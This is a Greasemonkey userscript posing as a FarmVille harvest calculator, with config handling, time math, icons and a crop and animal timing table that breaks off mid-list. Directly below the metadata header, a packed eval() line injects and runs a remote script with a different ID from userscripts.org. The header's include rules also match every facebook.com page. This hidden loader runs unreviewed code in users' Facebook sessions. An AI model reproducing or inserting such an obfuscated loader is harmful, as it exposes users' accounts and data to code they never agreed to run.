// ==UserScript==
// @name           Farmville Harvest Calculator Plus + Last Update
// @author         Alan Claughan
// @version        3.03.10
// @namespace      http://userscripts.org/users/aclaughan
// @description    Farmville Harvest Calculator - Select the item you are inquiring about from the top list, input the percentage of completion on the second list and then see when you can harvest it.
// @include        http://apps.facebook.com/onthefarm*
// @exclude        http://apps.facebook.com/onthefarm/gifts.*
// @exclude        http://apps.facebook.com/onthefarm/neig*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude        http://apps.facebook.com/onthefarm/help*
// @exclude        http://apps.facebook.com/onthefarm/invi*
// @exclude        http://apps.facebook.com/onthefarm/mone*
// @exclude        http://apps.facebook.com/onthefarm/fans*
// @copyright      2009 - 2010, Alan Claughan
// @require        http://sizzlemctwizzle.com/updater.php?id=61489
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var hc_version      = '3.03.10';
var hc_browser_name = hc_test_browser();
var hc_config_mode = "FALSE";

var hc_cfg_var = [ // Define selectable items for the Calculator
	"seeds"    , "on", "Seeds",
	"trees"    , "on", "Trees",
	"animals"  , "on", "Animals",
	"buildings", "on", "Buildings",
	"24hour"   , "on", "24 Hour Clock",
	"level"    ,  100 , "User Level"];
	
var hc_logo = '<tr><td width="50"><a href="http://userscripts.org/scripts/show/61489"><img id="hc_icon" src=data:image/gif;base64,'+
		'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 ' +
		'alt="HC Logo" hspace="0" vspace="0" align="left" border="0"></a></td>';
		
var hc_button_save = '<a href="#" ><img src="data:image/gif;base64,' +
	  	'R0lGODlhMgAMAPcAAAAAAP///5UGCZYHCJcJC5oRFJkRFJsSFZoSFZsTFZwUF5wVGJsVGJwWGZsWGZ0XGpwXGp0YGp0YG5wYG54ZHJ0ZHJ4aG54aHZ0aHJ0aHZ4bHp8cHp4cHp4cH6AdHp8dH58dIJ4dIKAeIKAe' +
	  	'IZ8eIZ4eIaAfIaAfIqEgIqEgI6AgI6EhJKIiI6EiI6EiJKEjJaMlJ96ztJQECJQECZYJDpYKEJkQFJoRFZoTGZoUGJwWGpwXG50YHJ4aHp4cIp8dIaAfI6AgJKEhJaAhJKEiJaEiJqEjJqInLKMqLqMtMaY0OdGY' +
	  	'muC4ueK8veXCw+TBwubExeXExejLzOfLzOvU1ZYKEZcNFZYNFJsVHZwYH5sZIZoZIpwcJJ8hKZ4hKaAkKqAmLqQtNaQvNaUxN6YzObJQVdCVmd+2uOG5u/Lj5J0fKKUyPLlka9qusvLk5aMwO6tCTrBNV7pncMmM' +
	  	'k9SgptSjqNiqr+7c3rVdaLlmccBzfb90fcR+h9GZoNapr963vMF7hsJ6hsWFksySntGgqt64wOzX29SotNesuNiwu9ixvNu3wuPK0t++yd+/ytu3xN+/y+HEz+HG0ubQ2uzb4+7i6fDm7PXu8+/n7vDn8Pby+P38' +
	  	'/vj2+/f2+/3+//7//////f///v/++f/++/77+P759fru6P359/37+vPd1fbk3fvz8O7Ow/La0vHb1Pnz8fnv7OzJwO/RytymneK1rcd0a82FfdGKgdGLg9GMhNWWj75fV8RtZtabluvT0bVLRbxYUsBlYL9lYMFo' +
	  	'Y8FqZMRwas2Ig86Lh9COiq04NK06NbdRTbZRTrlUUcVzcMZ5dsyDgMyEgd6wruXDwunJyI8AAJsTE6AbGKIhH6MhIaQmJa04Nq46Ob1kYsyFhM6LitKYmNObm9+0tOC4uN64uOK+vuXExOjLy+rPzwAAAAAAAAAA' +
	  	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAMgAMAAAI/wCJCBxIcKCLEyoKqlghcOHAhERWSBxSsKLFikY+MCiRoQFFIyQqZIh4gQORFycw' +
	  	'kKCgA4LLChdjVvwwps8Uc85EBPlA5o+xCF/8FHsgIkybZmzONGnyJNoHijJjpvCxCJa3QgF46bghKEApZVwytfKAIE+AYI9CjSNXDtrTqDFHgMEkS5sWO8MUeKHkixOuGYNC/aqRyBQMSKmsGUCQwwjcmCsy8NmE' +
	  	'itozFAnwBFh2SNU1OJ5uqdE0q0qjU+eknCMm4XFMIEnKmDEUQBcNRKK6EQqwy8qkWHICALviaBW4JeGYaXBt8cOaSrWqbbHESsylV2nceKJFINCoO66wYY+J1GqADAE2ijCvaKILI1Lf6HyyBSiAMCRHFAVI9qZT' +
	  	'gFwFZCEJKOLEwAQyLQSxXkEbKFEHFegcY8Ee0mRTwQFxRMENDnNMs00HPeiBhhNOQNELCwouOJARGzhAxAkLADFCCCoY8QIJICTEAQg/CETBBDvsIAEPQqhY0QojnCDQChARcdCSSgrkggpUOhRVQAA7" ' +
	    'alt="Config" border="0" hspace="0" vspace="0" id="hc_save" align="right"></a>';
	
var hc_button_config = '<a href="#" ><img src="data:image/gif;base64,' +
	  	'R0lGODlhMgAMAPcAAAAAAP///6EiJaEhJJQDBpcJC5gMD5kPEZgRFJsTFZoTFpsUF5wVF5sVGJwWGZsWGZ4YG50ZG54aHZ0aHJ0bHp8cH58eIaAfIaAfIp8fIqAgI58gIqIjJKEjJaIkJqElJ9SbnNeio9Wmp9mt' +
	  	'rpUGCpYIDJQIDJcMEpcMEJgNEZkOE5cPFZoRFZsVGpsWGpoWHJwXG50YHJ4bH50bIJ8dIZ4dI58fJaAgJKEjJqEkKaMmKaYzOK1DRrFMT8yMj86SlNOanOTDxOfJypsVHJ0dJZ8hJ6EkKqQsMqUuNKQuNqQwOKc3' +
	  	'Pqk9Q61AR6s/RrNTWcF1esmEiNyztd22uOLBw+7a258lLqIsNac0PqUzPac5Qqo9Rag9RrFRWbxvdsF1fMaBh82Sl9Wjp+nR06YyPaUzP7FTXbNVYLNWX7ttdbxze751fL10fMB5gcB6gcB8g9mssebMz+/d37lj' +
	  	'b7tqdcKAiMWGjrtreL9xfdqxt75zgcqOmOrT1/Hm6MSAjcaHlMyTntCbpdKirMWEk/Di5ceGl8eHmNSptdq0vtu5wseImsmKnciJm9auutiwvdizv+HDzezZ4OPI0/jw9Pr2+PDk6/n0+PTu9fv4/Pj2+/39//3+' +
	  	'//7/////+/768/348v/79v327v748v/+/fz07v349Pry7frw6/nu6fTd0/fo4uvKwO3Pxu/Wz/Pj3+O0q+fBus6Fe9STiduime7U0Mx+dM+Hf+O6teXBvb9gWMNtZcVwaMt9dc+IgbVJQrRNR7hRS7lSTLtYUr1f' +
	  	'Wb5iXcNuacd3cch6dc6JhNein9+zsOS8ueXDwaYpJqgsKagtKqkzMKo2Maw2Mq04NK08N7BCPrFGQbRKRbVOSbdQS7dVUrpcWcV3dM+OjNGVk9urqeC3tebFxOjIx+fIx+7Y15oODp4XF6IgHaEgH6IiIaIhIaEi' +
	  	'IaQkI6YrKqcsLKoxL6ozM6o2Nqs5Oa08PK8/PbNPT7lXVdCSkdSfn961teC6uujLy+zU1OvU1O/d3frz8ywAAAAAMgAMAAAI/wAFCBwocMCADgNxCBhAsCHDhgUTGoRIUQCGBg0WwBgIY8GDBRVwaGgQQwCOCg0E' +
	  	'VFDAUgEFCw0y4LiwYAFGDBUH0ijyZco3exE0SHgiRl+3eDCMhCnmQEIXb+qc/AACIoS9LfjgQcgBRUo+bhws5MRQBFEAcXICGEuBZ5OrIJRUTctiiVS1EnY8PRsUgJ+QfrrSBAhGBNKocHECvLpwo6KDOwF6HbAh' +
	  	'adWRSq3apTjDaRaZSQFglasj6hmjTtFMIDDgJoAvPQGOHTixh5Y7sRAHNDgESlqMCDvmdQkQS8WFF5JSOZm0T9MuNZ+eGQqgb0SydGsC/HqEqlkNHj3qPf/M7aIRqXcyKiCRZyZALRYChkBK1QTTMUGqRJx6ViiA' +
	  	'ECrKsMNGANgkoso5XPTxDyrYlETRAn4EMAwJKzjCyhKXwGJOAVpk8goWmvBiRSUBoOKMIp1Qo0IMLLTh2h8BCINCDl4EkEsLCkFUgRKRmHJPHgHIkgIgASzjAyGdZFOGJrYQQEcAoTyzSADWlJTAGwEAcwUhpNwT' +
	  	'BR+lXCNBRThEsMUU/pCDzDoV2ADGGHIws80CSVBBjAMzBHILOnPgAg0NAkCAxjj0KMAEHFVUAY42gOaEgwQwfDCAAxrggAEDGegwwUYaWICBpRVocAMGG2gwUAaoPvoADh44sFFOAw0cYEEGDWFggQYIWfSQBrQO' +
	  	'QGusOAnQgawWjEdQQAA7" alt="Config" border="0" hspace="0" vspace="0" id="hc_config" align="right"></a>';

			function hc_test_browser(){
				var hc_browser = 'Unsupported';
				if((navigator.userAgent.toLowerCase().indexOf('chrome' ) > -1) == true) { hc_browser = 'Chrome'; }
				if((navigator.userAgent.toLowerCase().indexOf('firefox') > -1) == true) { hc_browser = 'Netscape'; }
				return(hc_browser);
			}

			function hc_get_configuration_settings() {
				for (i=0; i < hc_cfg_var.length; i+=3) {
					if(hc_browser_name == 'Netscape') {
						var str = GM_getValue(hc_cfg_var[i],hc_cfg_var[i+1]);
						if (str == "ON") {
							str = "on";
						}
						if (str == "OFF") {
							str = "off";
						}
						hc_cfg_var[i+1] = str;
					};
					if(hc_browser_name == 'Chrome') {
						var hc_temp_str = localStorage.getItem(hc_cfg_var[i]);
						if(hc_temp_str!="undefined") {
							hc_cfg_var[i+1] = hc_temp_str;
						}
					}
				}
			}

			function hc_set_configuration_settings() { // Write Configuration Settings
				for (i=0; i < hc_cfg_var.length; i+=3) {
					if(hc_browser_name == 'Netscape') {
						GM_setValue(hc_cfg_var[i],hc_cfg_var[i+1]);
					}
					if(hc_browser_name == 'Chrome') {
						localStorage.setItem(hc_cfg_var[i],hc_cfg_var[i+1]);
					}
			  }
			}


function hc_clear_table() { // Reset the results table
  document.getElementById('Current').innerHTML = '';  
  document.getElementById('Harvest').innerHTML = '';  
  document.getElementById('Wither' ).innerHTML = '';  
  document.getElementById('Start'  ).innerHTML = '';  
  document.getElementById('End'    ).innerHTML = '';  
}

function hc_build_config() { // Generate the Config Page Contents
	var form1 = '<FORM id=configForm><b>Configuration Menu</b><BR>';
	for (i=0; i < hc_cfg_var.length - 3; i+=3) {
		form1 += '<INPUT type=checkbox NAME="' + hc_cfg_var[i];
		if(hc_cfg_var[i+1]=="on") {
			form1 += '" checked';
			}
		else {
			form1 += '"';
			}
		form1 += ' >' + hc_cfg_var[i+2] + '<BR>';
		}
	return form1 += '<INPUT type=text NAME="level" SIZE="2" MAXLENGTH="2" VALUE="' + hc_cfg_var[16] + '">&nbsp;Level<BR>' + '</FORM>';
}

function hc_button_click() { // Config 0r Save button Pressed
	if(hc_config_mode == "FALSE") { // Config Button Pressed
    hc_clear_table();
		document.getElementById("hc_buttons").innerHTML = hc_button_save;
		var form_data = hc_build_config();
		document.getElementById("hc_config_area").innerHTML = form_data;
		hc_config_mode = "TRUE"; 
    var new_plist = pList();
    document.getElementById('percentage_list').innerHTML = new_plist;
    document.getElementById('hc_percent').addEventListener('change',hc_calculate,false);
		return false;
	}
	else {
		hc_config_mode = "FALSE"; // Save Button Pressed
    
    save_config();
    
		document.getElementById("hc_buttons").innerHTML = hc_button_config;
		document.getElementById("hc_config_area").innerHTML = "";
    hc_clear_table();
  	return false;
	}
}

function save_config() { // Save Configuration Form State
    var form = document.forms.namedItem("configForm");
    for (j=0; j < hc_cfg_var.length - 3; j+=3) {
      form.elements.namedItem(hc_cfg_var[j]).checked == true ? hc_cfg_var[j+1] = "on" : hc_cfg_var[j+1] = "off";
    }
    
    if((form.elements.namedItem('level').value > 0) && (form.elements.namedItem('level').value < 71)) {
      hc_cfg_var[16] = form.elements.namedItem('level').value;
    }
    else {
      hc_cfg_var[16] = 100;
    }
    hc_set_configuration_settings();
    var new_ilist = iList();
    document.getElementById('item_list').innerHTML = new_ilist;
    document.getElementById('hc_item').addEventListener('change',hc_calculate,false);
}

function pv() { // Get Program Version from Script META data at the top of page
	return "<td><h2><b>Harvest<br>Calculator<br>v" + hc_version + "</b></h2></td></tr>";
}

Date.prototype.addTime= function(t) {
 this.setTime(this.getTime()+t);
 return this;
 }

function hc_time(id,time) {
	var day = new Array("Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat");
	var hc_hours = time.getHours();
	var hc_minutes = time.getMinutes();
	if (hc_minutes < 10) {
	 hc_minutes = "0" + hc_minutes;
	 }
	var hc_day = day [time.getDay()];
	if (hc_cfg_var[13] == "on") {
		var hc_time_out = hc_day + " " + hc_hours + ":" + hc_minutes;
	}
	else {
		if(hc_hours >= 12) {
			if(hc_hours > 12) {
  			hc_hours = hc_hours - 12;
			}
			var hc_time_tail = 'pm';
		}
		else {
			var hc_time_tail = 'am';			
		}
		var hc_time_out = hc_day + " " + hc_hours + ":" + hc_minutes + hc_time_tail;
	}
	outField(id,hc_time_out);
	}
	
function hc_tl(time_left) {
  time_left = time_left/60000
  var  day_in_m = 1440;
  var hour_in_m =  60;
  var d_day = Math.floor(time_left/day_in_m)
  time_left -= d_day*day_in_m;
  var d_hr = Math.floor(time_left/hour_in_m)
  time_left -= d_hr*hour_in_m;
  var result = time_left.toFixed(0);
  return d_day + "d," + d_hr + "h," + result + "m";
  }
  
function hc_calculate() {
  var p = document.getElementById('hc_percent');
  var percent = parseInt(p.options[p.selectedIndex].value);
  var h = document.getElementById('hc_item');
	var itemSelected = parseInt(h.options[h.selectedIndex].value);
  var hours = item[itemSelected + 1];
  var itemName = h.options[4];
  var hc_now = new Date();
  hc_clear_table();
  hc_time('Current',hc_now);
  var time_left = (hours * 3600000) * (percent/100);
  hc_now.addTime(time_left);
  hc_time('Harvest',hc_now);
	if (item[itemSelected + 2] == 0) {
		var wither_time = (hours * 3600000);
		hc_now.addTime(wither_time);
		hc_time('Wither',hc_now);
		outField('Start', hc_tl(time_left));
		outField('End', hc_tl(time_left + wither_time))
		}
  }

// Item Name : Time in Hours : Type : Level Available
var item = new Array(
	"Acai Tree", 46, 1, 1,
	"Acorn Squash", 10, 0, 36,
	"Almond Tree", 69, 1, 1,
	"Aloe Vera", 6, 0, 14,
	"Alpaca", 46, 2, 1,
	"Alpine Roses", 10, 0, 29,
	"Amaranth", 16, 0, 76,
	"Angora Rabbit", 46, 2, 1,
	"Appaloosa Foal", 23, 2, 1,
	"Appaloosa", 69, 2, 1,
	"Apple Tree", 69, 1, 1,
	"Apricot Tree", 92, 1, 8,
	"Artichokes", 92, 0, 6,
	"Asian Pear", 46, 1, 1,
	"Asparagus", 16, 0, 37,
	"Avocado Tree", 69, 1, 5,
	"Baby Elephant", 92, 2, 1,
	"Baby Tiger", 46, 2, 1,
	"Baby Turkey", 69, 2, 1,
	"Bamboo", 16, 0, 10,
	"Banana Tree", 69, 1, 14,
	"Basil", 10, 0, 48,
	"Bear Cub", 46, 2, 1,
	"Bell Peppers", 46, 0, 11,
	"Belted Calf", 23, 2, 1,
	"Belted Cow", 46, 2, 75,
	"Big Horn Sheep", 46, 2, 1,
	"Bison", 69, 2, 1,
	"Black Bear Cub", 46, 2, 1,
	"Black Chicken", 23, 2, 4,
	"Black Kitten", 69, 2, 1,
	"Black Sheep", 69, 2, 1,
	"Blackberries", 4, 0, 29,
	"Blueberries", 4, 0, 17,
	"Bobcat", 46, 2, 1,
	"Boer Goat", 46, 2, 1,
	"Bovine-09", 23, 2, 1,
	"Breadfruit Tree", 69, 1, 1,
	"Breton Horse", 69, 2, 1,
	"Broccoli", 46, 0, 35,
	"Brown Calf", 23, 2, 1,
	"Brown Chicken", 23, 2, 4,
	"Brown Cow", 23, 2, 1,
	"Brown Foal", 23, 2, 1,
	"Brown Goose", 46, 2, 1,
	"Buffalo", 69, 2, 1,
	"Bull", 23, 2, 1,
	"Cabbage", 46, 0, 27,
	"Caiman Lizard", 46, 2, 1,
	"Calf", 23, 2, 1,
	"Carnival Tree", 69, 1, 1,
	"Carrots", 12, 0, 22,
	"Cashew Tree", 69, 1, 7,
	"Cherry Tree", 46, 1, 1,
	"Chicken Cheer", 23, 2, 1,
	"Chicken Coop", 23, 3, 1,
	"Chicken Joy", 23, 2, 1,
	"Chicken", 23, 2, 4,
	"Chickpea", 20, 0, 10,
	"Chinchilla", 92, 2, 1,
	"Circus Elephant", 92, 2, 1,
	"Clover", 4, 0, 70,
	"Clumsy Reindeer", 46, 2, 1,
	"Clydesdale Foal", 23, 2, 1,
	"Clydesdale", 69, 2, 1,
	"Coconut Tree", 69, 1, 1,
	"Coffee", 16, 0, 23,
	"Corn", 69, 0, 24,
	"Cornish Chicken", 23, 2, 1,
	"Cotton", 69, 0, 9,
	"Cow", 23, 2, 1,
	"Cranberries", 10, 0, 10,
	"Cucumber", 23, 0, 43,
	"Daffodils", 46, 0, 8,
	"Daikon", 8, 0, 15,
	"Dairy Farm", 23, 3, 2,
	"Date Tree", 69, 1, 20,
	"Daylilies", 16, 0, 31,
	"Deer", 46, 2, 1,
	"Desert Tortoise", 46, 2, 1,
	"Doe", 69, 2, 1,
	"Donkey", 23, 2, 1,
	"Duck", 46, 2, 15,
	"Durian Tree", 92, 1, 1,
	"Edelweiss", 23, 0, 50,
	"Eggplant", 46, 0, 1,
	"Elderberries", 12, 0, 39,
	"Elk", 46, 2, 1,
	"Emperor Penguin", 46, 2, 1,
	"Fan Calf", 23, 2, 1,
	"Fan Cow", 23, 2, 1,
	"Fan Sheep", 69, 2, 1,
	"Fig Tree", 69, 1, 5,
	"Flamingo Flower", 16, 0, 7,
	"Forget-Me-Not", 18, 0, 90,
	"Gazelle", 69, 2, 1,
	"Ghost Chilli", 6, 0, 26,
	"Giant Panda", 46, 2, 1,
	"Gila Monster", 46, 2, 1,
	"Ginger", 16, 0, 42,
	"Ginko Tree", 69, 1, 60,
	"Goat", 46, 2, 18,
	"Goji Berry", 16, 0, 1,
	"Golden Chicken", 23, 2, 4,
	"Grape Sheep", 69, 2, 1,
	"Grapefruit Tree", 69, 1, 11, 
	"Grapes", 23, 0, 19,
	"Gray Fox Kit", 69, 2, 1,
	"Gray Horse", 69, 2, 1,
	"Greem Mallard", 46, 2, 1,
	"Green Calf", 23, 2, 1,
	"Green Tea", 10, 0, 28,
	"Grey Foal", 23, 2, 1,
	"Grey Goose", 46, 2, 1,
	"Grey Horse", 69, 2, 1,
	"Grey Tabby", 69, 2, 1,
	"Groovy Goat", 46, 2, 1,
	"Guava Tree", 69, 1, 15,
	"Gulmohar Tree", 69, 1, 1,
	"Haflinger Foal", 69, 1, 1,
	"Haflinger", 69, 1, 1,
	"Hampshire Lamb", 69, 2, 1,
	"Heirloom Carrot", 12, 0, 57,
	"High Kick Horse", 69, 2, 1,
	"Hollyhocks", 18, 0, 39,
	"Horse Spectator", 69, 2, 21,
	"Horse", 69, 2, 21,
	"Hot Pink Pig", 46, 2, 1,
	"Ibex", 46, 2, 1,
	"Indian Elephant", 92, 2, 1,
	"Indian Yak", 46, 2, 1,
	"Invisible Cat", 69, 2, 1,
	"Iris", 23, 0, 45,
	"Island Pig", 46, 1, 1,
	"Jack Rabbit", 46, 2, 1,
	"Jackalope", 46, 2, 1,
	"Jackfruit Tree", 69, 1, 1,
	"Kangaroo", 46, 2, 1,
	"Kelly Green Calf", 23, 2, 1,
	"Kelly Green Cow", 23, 2, 1,
	"Kick Ewe", 69, 2, 1,
	"Lamb", 69, 2, 1,
	"Langur Monkey", 46, 2, 1,
	"Lavender", 46, 0, 30,
	"Lemon Tree", 69, 1, 7,
	"Lilac", 10, 0, 4,
	"Lilies", 23, 0, 35,
	"Lime Tree", 115, 1, 10,
	"Line Quacker I", 46, 2, 1,
	"Line Quacker II", 46, 2, 1,
	"Llama", 69, 2, 1,
	"Long Horn Calf", 23, 2, 1,
	"Long Horn Cow", 23, 2, 1,
	"Lop-Eared Bunny", 46, 2, 1,
	"Love Ewe", 69, 2, 1,
	"Lychee Tree", 69, 1, 1,
	"Male Mandarin", 46, 2, 1,
	"Male Ostrich", 46, 2, 1,
	"Mandarin Tree", 92, 1, 1,
	"Mango Tree", 92, 1, 40,
	"Maple Tree", 46, 1, 1,
	"Monal", 46, 2, 1,
	"Moose", 69, 2, 1,
	"Morgan Horse", 46, 2, 1,
	"Morning Glory", 12, 0, 1,
	"Neapolitan Calf", 23, 2, 1,
	"Neapolitan Cow", 23, 2, 1,
	"Oats", 8, 0, 53,
	"Olive Tree", 92, 1, 32,
	"Onion", 12, 0, 34,
	"Orange Tabby", 23, 2, 1,
	"Orange Tree", 92, 1, 1,
	"Ornament Tree I", 92, 1, 1,
	"Ornament Tree II", 92, 1, 1,
	"Ossabaw Pig", 46, 2, 1,
	"Ox", 69, 2, 1,
	"Passion Fruit Tree", 115, 1, 17,
	"Pattypan Squash", 16, 0, 16,
	"Peach Tree", 92, 1, 4,
	"Peacock", 46, 2, 1,
	"Peanuts", 16, 0, 1,
	"Peas", 23, 0, 32,
	"Pelican", 46, 1, 1,
	"Penguin", 69, 2, 1,
	"Peppers", 23, 0, 12,
	"Percheron Foal", 23, 2, 1,
	"Persimmon Tree", 92, 1, 1,
	"Pheasant", 46, 2, 85,
	"Pig", 46, 2, 10,
	"Pineapples", 46, 0, 15,
	"Pink Calf", 23, 2, 1,
	"Pink Cow", 23, 2, 1,
	"Pink Haired Pony", 69, 2, 1,
	"Pink Hibiscus", 22, 0, 23,
	"Pink Patch Calf", 23, 2, 1,
	"Pink Patch Cow", 23, 2, 1,
	"Pink Pony Foal", 23, 2, 1,
